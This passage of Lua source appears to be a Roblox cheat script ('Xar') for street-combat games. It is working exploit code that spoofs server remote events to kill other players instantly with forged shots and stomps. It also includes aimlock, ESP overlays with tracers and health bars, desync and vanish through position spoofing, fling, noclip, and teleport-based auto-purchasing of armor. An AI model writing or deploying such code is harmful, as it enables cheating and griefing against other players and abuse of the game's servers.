                                    return
                                elseif Armor_Busy == false then
									task.wait()
									if nearestTarget == nil or nearestTarget.Character == nil then return end
									if nearestTarget.Character:FindFirstChild('State') then
										if Insta_Kill_SpawnKill == true and nearestTarget.Character:WaitForChild('State')['Down'].Value == true then
											local orientation = Player.Character.HumanoidRootPart.CFrame - Player.Character.HumanoidRootPart.Position
											local newPosition = nearestTarget.Character.UpperTorso.Position + Vector3.new(0, 4.5, 0)
											Player.Character.HumanoidRootPart.CFrame = orientation + newPosition
											task.wait(.1)
								
											local args = {
												[1] = 'Stomp'
											}
							
											game:GetService("ReplicatedStorage").Remote:FireServer(unpack(args))
											return
										else
											if nearestTarget.Character:FindFirstChild('State') then
												repeat task.wait() until nearestTarget.Character:WaitForChild('State')['Down'].Value ~= true and nearestTarget.Character.State["Carried"].Value ~= true
											elseif nearestTarget.Character:FindFirstChild('BodyEffects') then
												repeat task.wait() until nearestTarget.Character:WaitForChild('BodyEffects')['K.O'].Value ~= true and nearestTarget.Character.BodyEffects["Grabbed"].Value ~= true
											end
										end
									elseif nearestTarget.Character:FindFirstChild('BodyEffects') then
										if Insta_Kill_SpawnKill == true and nearestTarget.Character:WaitForChild('BodyEffects')['K.O'].Value == true then
											local orientation = Player.Character.HumanoidRootPart.CFrame - Player.Character.HumanoidRootPart.Position
											local newPosition = nearestTarget.Character.UpperTorso.Position + Vector3.new(0, 4.5, 0)
											Player.Character.HumanoidRootPart.CFrame = orientation + newPosition
											task.wait(.1)
								
											local args = {
												[1] = 'Stomp'
											}
									
											game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
											return
										else
											if nearestTarget.Character:FindFirstChild('State') then
												repeat task.wait() until nearestTarget.Character:WaitForChild('State')['Down'].Value ~= true and nearestTarget.Character.State["Carried"].Value ~= true
											elseif nearestTarget.Character:FindFirstChild('BodyEffects') then
												repeat task.wait() until nearestTarget.Character:WaitForChild('BodyEffects')['K.O'].Value ~= true and nearestTarget.Character.BodyEffects["Grabbed"].Value ~= true
											end
										end
									end
									task.wait()
									--nearestTarget.Character:WaitForChild('HumanoidRootPart').CanCollide = false
									local RADIUS = OrbitRadiusConfig
									ECLIPSE = 1 * RADIUS
                                    rot = rot + dt * OrbitSpeedConfig
                                    Player.Character:WaitForChild('HumanoidRootPart').CFrame =
                                        ROTATION * CFrame.new(sin(rot) * ECLIPSE, OrbitHeightConfig, cos(rot) * RADIUS) +
                                        nearestTarget.Character:WaitForChild('HumanoidRootPart').Position

										task.spawn(function()
											pcall(function()
												if nearestTarget.Character:FindFirstChild('State') then
													if nearestTarget.Character:WaitForChild('State')['Down'].Value ~= true and nearestTarget.Character.State["Carried"].Value ~= true then
														if Player.Character:FindFirstChildOfClass('Tool') and Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('GunScript') or Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('GunData') or Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('Ammo') then
														--if V_Db == false then
														task.spawn(function()
															Vanish_Pause = true
															task.wait(.5)
															Vanish_Pause = false
														end)
														--end
														task.wait(.1)
		
														local Target = nearestTarget.Character
		
														local Mag_Check = (Target.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
		
														if game.PlaceId == 9825515356 and Mag_Check <= InstaKill_Distance and Target:FindFirstChild('ForceField') == nil then
															if ForceFieldCheck == true and Target:FindFirstChild('ForceField') == nil then
																local args = {
																	[1] = "GunCheck"
																}
																
																game:GetService("ReplicatedStorage").MainFunction:InvokeServer(unpack(args))
																
																task.wait()
																
																local args = {
																	[1] = "Shoot",
																	[2] = {
																		[1] = {
																			[1] = {
																				["Instance"] = Target.Head,
																				["Normal"] = Target.Head.Position,
																				["Position"] = Target.Head.Position
																			}
																		},
																		[2] = {
																			[1] = {
																				["thePart"] = Target.Head,
																				["theOffset"] = CFrame.new(0, 0, 0)
																			}
																		},
																		[3] = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Handle.Position,
																		[4] = Target.Head.Position,
																		[5] = tick()
																	}
																}
																
																game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
																task.wait(.1)
															elseif ForceFieldCheck == false then
																local args = {
																	[1] = "GunCheck"
																}
																
																game:GetService("ReplicatedStorage").MainFunction:InvokeServer(unpack(args))
																
																task.wait()
																
																local args = {
																	[1] = "Shoot",
																	[2] = {
																		[1] = {
																			[1] = {
																				["Instance"] = Target.Head,
																				["Normal"] = Target.Head.Position,
																				["Position"] = Target.Head.Position
																			}
																		},
																		[2] = {
																			[1] = {
																				["thePart"] = Target.Head,
																				["theOffset"] = CFrame.new(0, 0, 0)
																			}
																		},
																		[3] = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Handle.Position,
																		[4] = Target.Head.Position,
																		[5] = tick()
																	}
																}
																
																game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
																task.wait(.1)
															end
														elseif game.PlaceId == 82673729815802 then
															game:GetService("ReplicatedStorage").Remote:FireServer('Shooting', game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool'))
															
															local ohString1 = "GunDamage"
															local ohInstance2 = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool')
															local ohInstance3 = Target.Hitbox
															local ohInstance4 = Target.Humanoid
															local ohNil5 = nil
															local ohVector36 = Vector3.new(4, 5, 1.5)
	
															game:GetService("ReplicatedStorage").Remote:FireServer(ohString1, ohInstance2, ohInstance3, ohInstance4, ohNil5, ohVector36)
															game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Ammo_CLIENT.Value = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Ammo.Value
															task.wait(.1)
														elseif game.PlaceId ~= 9825515356 then
		
														local args = {
															[1] = "Shoot"
														}
													
														game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer(unpack(args))
													
														local args = {
															[1] = "ShootGun",
															[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
															[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
															[4] = Target.Head.Position,
															[5] = Target.Head,
															[6] = Vector3.new(0, 1, 0)
														}
													
														game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
		
														local args = {
															[1] = "ShootGun",
															[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
															[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
															[4] = Target.HumanoidRootPart.Position,
															[5] = Target.HumanoidRootPart,
															[6] = Vector3.new(0, 1, 0)
														}
													
														game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
													
														game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer()
														end
													end
													end
												elseif nearestTarget.Character:FindFirstChild('BodyEffects') then
													if nearestTarget.Character:WaitForChild('BodyEffects')['K.O'].Value ~= true and nearestTarget.Character.BodyEffects["Grabbed"].Value ~= true then
														if Player.Character:FindFirstChildOfClass('Tool') and Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('GunScript') or Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('GunData') or Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('Ammo') then
														--if V_Db == false then
														task.spawn(function()
															Vanish_Pause = true
															task.wait(.5)
															Vanish_Pause = false
														end)
														--end
														task.wait(.1)
		
														local Target = nearestTarget.Character
		
														local Mag_Check = (Target.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
		
														if game.PlaceId == 9825515356 and Mag_Check <= InstaKill_Distance and Target:FindFirstChild('ForceField') == nil then
															if ForceFieldCheck == true and Target:FindFirstChild('ForceField') == nil then
																local args = {
																	[1] = "GunCheck"
																}
																
																game:GetService("ReplicatedStorage").MainFunction:InvokeServer(unpack(args))
																
																task.wait()
																
																local args = {
																	[1] = "Shoot",
																	[2] = {
																		[1] = {
																			[1] = {
																				["Instance"] = Target.Head,
																				["Normal"] = Target.Head.Position,
																				["Position"] = Target.Head.Position
																			}
																		},
																		[2] = {
																			[1] = {
																				["thePart"] = Target.Head,
																				["theOffset"] = CFrame.new(0, 0, 0)
																			}
																		},
																		[3] = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Handle.Position,
																		[4] = Target.Head.Position,
																		[5] = tick()
																	}
																}
																
																game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
																task.wait(.1)
															elseif ForceFieldCheck == false then
																local args = {
																	[1] = "GunCheck"
																}
																
																game:GetService("ReplicatedStorage").MainFunction:InvokeServer(unpack(args))
																
																task.wait()
																
																local args = {
																	[1] = "Shoot",
																	[2] = {
																		[1] = {
																			[1] = {
																				["Instance"] = Target.Head,
																				["Normal"] = Target.Head.Position,
																				["Position"] = Target.Head.Position
																			}
																		},
																		[2] = {
																			[1] = {
																				["thePart"] = Target.Head,
																				["theOffset"] = CFrame.new(0, 0, 0)
																			}
																		},
																		[3] = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Handle.Position,
																		[4] = Target.Head.Position,
																		[5] = tick()
																	}
																}
																
																game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
																task.wait(.1)
															end
														elseif game.PlaceId ~= 9825515356 then
		
														local args = {
															[1] = "Shoot"
														}
													
														game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer(unpack(args))
													
														local args = {
															[1] = "ShootGun",
															[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
															[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
															[4] = Target.Head.Position,
															[5] = Target.Head,
															[6] = Vector3.new(0, 1, 0)
														}
													
														game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
		
														local args = {
															[1] = "ShootGun",
															[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
															[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
															[4] = Target.HumanoidRootPart.Position,
															[5] = Target.HumanoidRootPart,
															[6] = Vector3.new(0, 1, 0)
														}
													
														game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
													
														game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer()
														end
													end
													end
												end
											end)
										end)
                                end
                            end
                            )
                        end
                    )
                    while task.wait() do
                        if C_Active == true then
                            pcall(
                                function()
                                    local part = nearestTarget.Character.HumanoidRootPart
                                    if U_Active == false then
                                        local Calculated_Offset = LockMethod("Velocity", part)
                                        workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)
                                    else
                                        local Calculated_Offset = LockMethod("MoveDirection", part)
                                        workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)
                                    end
                                end
                            )
                        else
                            return
                        end
                    end
			elseif C_Active == true then
				C_Active = false
			end
		end
	end
)

--// Vanish \\--

local vdb = false
local vdb2 = false

local Part = Instance.new('Part')
Part.Name = "VanishPart"
Part.CanCollide = false
Part.Anchored = true
Part.Transparency = 1
Part.Size = Vector3.new(1,1,1)

UIS.InputBegan:Connect(function(Input,IsTyping)
	if IsTyping or vdb == true then
		return
	end
	if Input.KeyCode == Enum.KeyCode[VanishKeyConfig] and P_Active == false and Vanish == true then
		task.spawn(function()
			Vanish_Pause = false
			vdb = true
			task.wait(.1)
			vdb = false
		end)
		P_Active = true
		Rayfield:Notify({
			Title = "Xar | Vanish",
			Content = tostring(P_Active),
			Duration = 3.5,
			Image = 4483362458,
		})
		--local Part = workspace:FindFirstChild('VanishPart')
		task.wait()
		workspace.CurrentCamera.CameraSubject = Part
		task.spawn(function()
			game:GetService('RunService').Heartbeat:Connect(function()
				local LocalPlayer = Player
				local OldPos = LocalPlayer.Character.HumanoidRootPart.CFrame
				local Origin = LocalPlayer.Character.HumanoidRootPart
				local randomRange = Radius
				if P_Active == false or Vanish == false then return end
				if Armor_Busy == false and Vanish_Pause == false and Vanish == true then
					workspace.CurrentCamera.CameraSubject = Part
					LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-10000, 10000), 100000 + math.random(0, 100000), math.random(-10000, 10000))
					game:GetService("RunService").RenderStepped:Wait()
					LocalPlayer.Character.HumanoidRootPart.CFrame = OldPos
					Part.CFrame = OldPos * CFrame.new(0,2,0)
				elseif P_Active == true and Vanish == true and Vanish_Pause == true then
					workspace.CurrentCamera.CameraSubject = Player.Character:WaitForChild('Humanoid')
				end
			end)
		end)
	elseif Input.KeyCode == Enum.KeyCode[VanishKeyConfig] and P_Active == true then
		task.spawn(function()
			vdb = true
			task.wait(.1)
			vdb = false
		end)
		P_Active = false
		Rayfield:Notify({
			Title = "Xar | Vanish",
			Content = tostring(P_Active),
			Duration = 3.5,
			Image = 4483362458,
		})
		workspace.CurrentCamera.CameraSubject = Player.Character:WaitForChild('Humanoid')
		if workspace:FindFirstChild("VanishPart") then
			--workspace:FindFirstChild("VanishPart"):Destroy()
		end
	end
end)


--// CFrame Desync \\--

UIS.InputBegan:Connect(function(Input,IsTyping)
	if IsTyping then
		return
	end
	if Input.KeyCode == Enum.KeyCode[DesyncKeyConfig] and B_Active == false and Desync == true then 
		B_Active = true
		Rayfield:Notify({
			Title = "Xar | Desync",
			Content = tostring(B_Active),
			Duration = 3.5,
			Image = 4483362458,
		})
		local Part
		task.spawn(function()
			Part = Instance.new("Part")
			Part.Name = "DesyncPart"
			Part.CanCollide = false
			Part.Anchored = true
			Part.Transparency = .75
			Part.Size = Vector3.new(1,1,1)
			task.spawn(function()
				while task.wait(.1) do
					if B_Active == false then break end
					Part.BrickColor = BrickColor.new("Really red")
				end
			end)
		end)
		task.wait()
		workspace.CurrentCamera.CameraSubject = Part
		task.spawn(function()
			game:GetService('RunService').Heartbeat:Connect(function()
				if B_Active ~= true then return end
				local LocalPlayer = Player
				local OldPos = LocalPlayer.Character.HumanoidRootPart.CFrame
				local Origin = LocalPlayer.Character.HumanoidRootPart
				local randomRange = Radius
				LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(Origin.Position) + Vector3.new(math.random(-randomRange, randomRange), math.random(-randomRange, randomRange), math.random(-randomRange, randomRange))) * CFrame.Angles(math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)))
				game:GetService("RunService").RenderStepped:Wait()
				LocalPlayer.Character.HumanoidRootPart.CFrame = OldPos
				Part.CFrame = OldPos * CFrame.new(0,3,0)
			end)
		end)
	elseif Input.KeyCode == Enum.KeyCode[DesyncKeyConfig] and B_Active == true then
		B_Active = false
		Rayfield:Notify({
			Title = "Xar | Desync",
			Content = tostring(B_Active),
			Duration = 3.5,
			Image = 4483362458,
		})
		workspace.CurrentCamera.CameraSubject = Player.Character:WaitForChild('Humanoid')
		workspace:FindFirstChild("DesyncPart"):Destroy()
	end
end)

--// Anti-Lock \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[AntiKeyConfig] and AntiLock == true then
			if Y_Active == false then
				Y_Active = true
				task.spawn(
					function()
						Rayfield:Notify({
							Title = "Xar | Anti-Lock",
							Content = tostring(Y_Active),
							Duration = 3.5,
							Image = 4483362458,
						 })
					end
				)
				task.spawn(
					function()
						game:GetService("RunService").Heartbeat:Connect(
						function()
							if Y_Active == false then
								return
							end
							if Y_Active == true then
								local RootPart = Player.Character.HumanoidRootPart
								local Velocity = RootPart.Velocity
								RootPart.Velocity = Vector3.new(Velocity.X, 9e9, Velocity.Z)
								game:GetService("RunService").RenderStepped:Wait()
								RootPart.Velocity = Velocity
							end
						end
						)
					end
				)
			elseif Y_Active == true then
				Y_Active = false
                		Rayfield:Notify({
							Title = "Xar | Anti-Lock",
							Content = tostring(Y_Active),
							Duration = 3.5,
							Image = 4483362458,
						 })
			end
		end
	end
)

--// Resolver \\--

UIS.InputBegan:Connect(function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[ResolverKeyConfig] and Resolver == true then
			if U_Active == false then
				U_Active = true
				task.spawn(
					function()
						Rayfield:Notify({
							Title = "Xar | Resolver",
							Content = tostring(U_Active),
							Duration = 3.5,
							Image = 4483362458,
						})
					end
				)
			elseif U_Active == true then
				task.spawn(
					function()
					end
				)
				U_Active = false
				Rayfield:Notify({
					Title = "Xar | Resolver",
					Content = tostring(U_Active),
					Duration = 3.5,
					Image = 4483362458,
				})
			end
		end
	end)

--// ESP \\--

task.spawn(function()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local camera = workspace.CurrentCamera

local localPlayer = Players.LocalPlayer

local function drawPlayerESP(targetPlayer)
    if targetPlayer == localPlayer then return end
	task.wait()
    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    local Character = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()

	task.wait()

    local tracer = Drawing.new("Line")
    tracer.Thickness = 2
    tracer.Color = ESP_Color
    tracer.Transparency = 1
    tracer.Visible = false
	local box = Drawing.new("Square")
	local nameTag = Drawing.new("Text")
	
	local healthBG = Drawing.new("Square")
	local healthBar = Drawing.new("Square")
	
	local shieldBG = Drawing.new("Square")
	local shieldBar = Drawing.new("Square")
	
	local boxThickness = 2
	box.Thickness = boxThickness
	box.Filled = false
	box.Color = ESP_Color
	box.Visible = false

	nameTag.Size = 16
	nameTag.Center = true
	nameTag.Outline = true
	nameTag.Color = ESP_Color
	nameTag.Visible = false
	
	shieldBG.Filled = true
	shieldBG.Color = Color3.new(0.3, 0.3, 0.3)
	shieldBG.Visible = false
	
	shieldBar.Filled = true
	shieldBar.Color = Color3.new(0.5, 0.7, 1)
	shieldBar.Visible = false
	
	healthBG.Filled = true
	healthBG.Color = Color3.new(1, 0, 0)
	healthBG.Visible = false
	
	healthBar.Filled = true
	healthBar.Color = Color3.new(0, 1, 0)
	healthBar.Visible = false

    local function updateESP(d)
		task.wait()
		if d == 'delete' then
            tracer:Destroy()
            box:Destroy()
            nameTag:Destroy()
            healthBG:Destroy()
            healthBar:Destroy()
			shieldBG:Destroy()
            shieldBar:Destroy()
			return
		end

		if not targetPlayer then
            tracer:Destroy()
            box:Destroy()
            nameTag:Destroy()
            healthBG:Destroy()
            healthBar:Destroy()
			shieldBG:Destroy()
            shieldBar:Destroy()
            return
        end

        if not L_Active then
			tracer.Visible = false
            box.Visible = false
            nameTag.Visible = false
            healthBG.Visible = false
            healthBar.Visible = false
			shieldBG.Visible = false
            shieldBar.Visible = false
			return
		else
			if TracersEnabled == true then
				tracer.Visible = true
			else
				tracer.Visible = false
			end
            box.Visible = true
            nameTag.Visible = true
            healthBG.Visible = true
            healthBar.Visible = true
			shieldBG.Visible = true
            shieldBar.Visible = true
        end

		local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
		local Character = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()

        local targetHRP = Character:WaitForChild('HumanoidRootPart')
        local humanoid = Character:WaitForChild("Humanoid")
        local rootPart = Character:WaitForChild('HumanoidRootPart')

        if targetHRP and rootPart and humanoid then
			local targetHRP = Character:WaitForChild('HumanoidRootPart')
			local humanoid = Character:WaitForChild("Humanoid")
			local rootPart = Character:WaitForChild("HumanoidRootPart")
			local rootPart2 = character:WaitForChild("HumanoidRootPart")

            local targetPos, onScreen = camera:WorldToViewportPoint(targetHRP.Position)
			local rootPos2, rootOnScreen2 = camera:WorldToViewportPoint(rootPart2.Position)
            local rootPos, rootOnScreen = camera:WorldToViewportPoint(rootPart.Position)
			local headPos, headVisible = camera:WorldToViewportPoint(rootPart.Position + Vector3.new(0, 2.5, 0))
            local footPos, footVisible = camera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, 3, 0))

			if onScreen and headVisible and footVisible then
				local targetHRP = Character:WaitForChild('HumanoidRootPart')
				local humanoid = Character:WaitForChild("Humanoid")
				local rootPart = Character:WaitForChild("HumanoidRootPart")

				local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
				local Character = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
				
                tracer.From = Vector2.new(rootPos2.X, rootPos2.Y)
                tracer.To = Vector2.new(targetPos.X, targetPos.Y)
				if TracersEnabled == true then
					tracer.Visible = true
				else
					tracer.Visible = false
                end

                local height = math.abs(headPos.Y - footPos.Y)
                local width = height / 2.2

                box.Size = Vector2.new(width, height)
                box.Position = Vector2.new(rootPos.X - width / 2, rootPos.Y - height / 2)
                box.Visible = true
				box.Color = ESP_Color

                nameTag.Position = Vector2.new(rootPos.X, box.Position.Y - 18)
                nameTag.Size = math.clamp(height / 8, 10, 20)
                nameTag.Text = Character.Humanoid.DisplayName..' ( '..targetPlayer.Name..' )'
                nameTag.Visible = true
				nameTag.Color = ESP_Color
				
                local healthPercent = Character.Humanoid.Health / Character.Humanoid.MaxHealth
                local shieldPercent = Character.BodyEffects.Armor.Value / 150

                local barHeight = height
                local healthHeight = barHeight * healthPercent
                local shieldHeight = barHeight * shieldPercent

                local barWidth = boxThickness

                shieldBG.Size = Vector2.new(barWidth, barHeight)
                shieldBG.Position = Vector2.new(box.Position.X - (barWidth * 2) - 6, box.Position.Y)
                shieldBG.Visible = true

                shieldBar.Size = Vector2.new(barWidth, shieldHeight)
                shieldBar.Position = Vector2.new(shieldBG.Position.X, shieldBG.Position.Y + (barHeight - shieldHeight))
                shieldBar.Visible = true

                healthBG.Size = Vector2.new(barWidth, barHeight)
                healthBG.Position = Vector2.new(shieldBG.Position.X + barWidth + 2, box.Position.Y)
                healthBG.Visible = true

                healthBar.Size = Vector2.new(barWidth, healthHeight)
                healthBar.Position = Vector2.new(healthBG.Position.X, healthBG.Position.Y + (barHeight - healthHeight))
                healthBar.Visible = true
            else
				tracer.Visible = false
				box.Visible = false
				nameTag.Visible = false
				healthBG.Visible = false
				healthBar.Visible = false
				shieldBG.Visible = false
				shieldBar.Visible = false
            end
        end
    end

	local t_name = targetPlayer.Name

    local connection
    connection = RunService.RenderStepped:Connect(function()
		RunService.RenderStepped:Wait()
        if game:GetService('Players'):FindFirstChild(t_name) == nil then
			--print('delete')
			updateESP('delete')
            connection:Disconnect()
		else
			updateESP()
        end
    end)
end

task.spawn(function()

local function addPlayerESP(player)
    if player ~= localPlayer then
        --[[player.CharacterAdded:Connect(function()
            drawPlayerESP(player)
        end)]]
		task.wait(1)
		drawPlayerESP(player)
    end
end

task.spawn(function()
task.wait(1.5)
for _, player in ipairs(Players:GetPlayers()) do
	task.wait()
	task.spawn(function()
		addPlayerESP(player)
	end)
end
end)

Players.PlayerAdded:Connect(function(Target)
	task.spawn(function()
		Target.CharacterAdded:Wait()
		task.wait(2.5)
		addPlayerESP(Target)
	end)
end)

end)

UIS.InputBegan:Connect(function(Input, IsTyping)
	if IsTyping then
		return
	end
	if Input.KeyCode == Enum.KeyCode[ESPKeyConfig] and ESP == true then
		if L_Active == false then
			L_Active = true
			--print('on')
		else
			L_Active = false
			--print('off')
		end
	end
end)

end)

--// Fling \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[FlingTargetKeyConfig] and FlingTarget == true then
			task.spawn(
				function()
					local nearestTarget = ""
					local nearestDistance = math.huge

					local Max_Distance = 75
					for i, v in ipairs(game.Players:GetPlayers()) do
						if
							v ~= Player and v.Character and v.Character:FindFirstChild("Humanoid") and
							v.Character:FindFirstChild("Humanoid").Health ~= 0
						then
							local TargetHRP = v.Character.HumanoidRootPart
							local mag = (Mouse.Hit.Position - TargetHRP.Position).magnitude
							if mag < nearestDistance and mag <= Max_Distance then
								nearestDistance = mag
								nearestTarget = v
							end
						end
					end
					if nearestTarget == "" or nearestTarget == Player then
						return
					end
					lastTarget = nearestTarget
					task.spawn(
						function()
							local Target = nearestTarget
							task.wait()
							local cfrm = Player.Character.HumanoidRootPart.CFrame
							task.wait()
							local vel = .625
							for count = 0, 25, 1 do
								task.wait()
								local FlingTorso = Target.Character.HumanoidRootPart
								Player.Character.HumanoidRootPart.CFrame =
									CFrame.new(FlingTorso.Position + FlingTorso.Velocity * vel)
								Player.Character.HumanoidRootPart.Velocity = Vector3.new(7500, 7500, 7500)
								task.spawn(
									function()
										task.wait()
										Player.Character.HumanoidRootPart.CFrame = cfrm
									end
								)
							end
							for count = 0, 100, 1 do
								Player.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
								Player.Character.PrimaryPart.Velocity = Vector3.new(0, 0, 0)
								Player.Character.PrimaryPart.RotVelocity = Vector3.new(0, 0, 0)
								Player.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
								Player.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
								Player.Character.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
								Player.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
								Player.Character.HumanoidRootPart.CFrame =
									cfrm * CFrame.Angles(math.rad(0), math.rad(137.92), math.rad(0))
							end
						end
					)
				end
			)
		end
	end
)

--// Noclip \\--

local NoclipTable = {}

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[NoclipKeyConfig] and Noclip == true then
			if N_Active == false then
				task.spawn(
					function()
					end
				)
				N_Active = true

				Rayfield:Notify({
					Title = "Xar | Noclip",
					Content = tostring(N_Active),
					Duration = 3.5,
					Image = 4483362458,
				})
				for i, v in next, Player.Character:GetChildren() do
					if v:IsA("BasePart") or v:IsA("Part") and v.CanCollide == true then
						table.insert(NoclipTable, v.Name)
						task.spawn(
							function()
								while task.wait() do
									if N_Active ~= true then
										break
									end
									v.CanCollide = false
								end
							end
						)
					elseif v:IsA("Accessory") then
						task.spawn(
							function()
								while task.wait() do
									if N_Active ~= true then
										break
									end
									v.Handle.CanCollide = false
								end
							end
						)
					end
				end
			else
				task.spawn(
					function()
					end
				)
				N_Active = false
				Rayfield:Notify({
					Title = "Xar | Noclip",
					Content = tostring(N_Active),
					Duration = 3.5,
					Image = 4483362458,
				})
				for i, v in next, Player.Character:GetChildren() do
					if v:IsA("BasePart") or v:IsA("Part") and not table.find(NoclipTable, v.Name) then
						task.spawn(
							function()
								--v.CanCollide = true
							end
						)
					elseif v:IsA("Accessory") then
						task.spawn(
							function()
								v.Handle.CanCollide = true
							end
						)
					end
				end
			end
		end
	end
)

--// Auto-Armor \\--

local Armor_CD = false

task.spawn(function()
	while task.wait() do
		pcall(function()
			--if Player.Backpack:FindFirstChild('TipJar') or Player.Character:FindFirstChild('TipJar') then
				if Player.Character:FindFirstChild('State') then
					if Player.Character.State.Shield.Value <= 100 and AutoArmor == true and Player.Character.State['Down'].Value ~= true and Player.Character.State["Carried"].Value ~= true and Armor_Busy == false and Armor_CD == false then
						task.spawn(function()
							Armor_Busy = true
							Vanish_Pause = true
							task.wait(.75)
							Armor_Busy = false
							Vanish_Pause = false
						end)
						task.spawn(function()
							Armor_CD = true
							task.wait(.75)
							Armor_CD = false
						end)
						local Tool = Player.Character:FindFirstChildOfClass('Tool')
						if Tool then
							Tool.Parent = Player.Backpack
						end
						local old_cfrm = Player.Character:WaitForChild("HumanoidRootPart").CFrame
						task.wait(.25)
						Player.Character:WaitForChild("HumanoidRootPart").CFrame = workspace.Blacklisted.Bought:GetChildren()[38]["High-Medium Shield"].CFrame
						task.wait(.25)
						Player.Character:WaitForChild("HumanoidRootPart").CFrame = workspace.Blacklisted.Bought:GetChildren()[38]["High-Medium Shield"].CFrame
						fireclickdetector(workspace.Blacklisted.Bought:GetChildren()[38]["High-Medium Shield"].Parent.ClickDetector)
						task.wait(.35)
						Player.Character:WaitForChild("HumanoidRootPart").CFrame = old_cfrm
						task.wait(.1)
						if Tool then
							Tool.Parent = Player.Character
						end
					end
				elseif Player.Character:FindFirstChild('BodyEffects') then
					if Player.Character.BodyEffects.Armor.Value <= 100 and AutoArmor == true and Player.Character.BodyEffects['K.O'].Value ~= true and Player.Character.BodyEffects["Grabbed"].Value ~= true and Armor_Busy == false and Armor_CD == false then
						task.spawn(function()
							Armor_Busy = true
							Vanish_Pause = true
							task.wait(.75)
							Armor_Busy = false
							Vanish_Pause = false
						end)
						task.spawn(function()
							Armor_CD = true
							task.wait(.75)
							Armor_CD = false
						end)
						local Tool = Player.Character:FindFirstChildOfClass('Tool')
						if Tool then
							Tool.Parent = Player.Backpack
						end
						local old_cfrm = Player.Character:WaitForChild("HumanoidRootPart").CFrame
						task.wait(.25)
						Player.Character:WaitForChild("HumanoidRootPart").CFrame = workspace.Ignored.Shop['[High-Medium Armor] - $2513'].Head.CFrame
						task.wait(.25)
						Player.Character:WaitForChild("HumanoidRootPart").CFrame = workspace.Ignored.Shop['[High-Medium Armor] - $2513'].Head.CFrame
						fireclickdetector(workspace.Ignored.Shop['[High-Medium Armor] - $2513'].ClickDetector)
						task.wait(.35)
						Player.Character:WaitForChild("HumanoidRootPart").CFrame = old_cfrm
						task.wait(.1)
						if Tool then
							Tool.Parent = Player.Character
						end
					end
				end
			--end
		end)
	end
end)

--// Anti-Stomp \\--

task.spawn(function()
	-- Reset when low
	while task.wait() do
		pcall(function()
			if Player.Character:FindFirstChild('State') then
				if Player.Character.State['Down'].Value == true and AntiStomp == true then
					game.Players.LocalPlayer.Character.Head:Destroy()
					task.wait(1)
				end
			elseif Player.Character:FindFirstChild('BodyEffects') then
				if Player.Character.BodyEffects['K.O'].Value == true and AntiStomp == true then
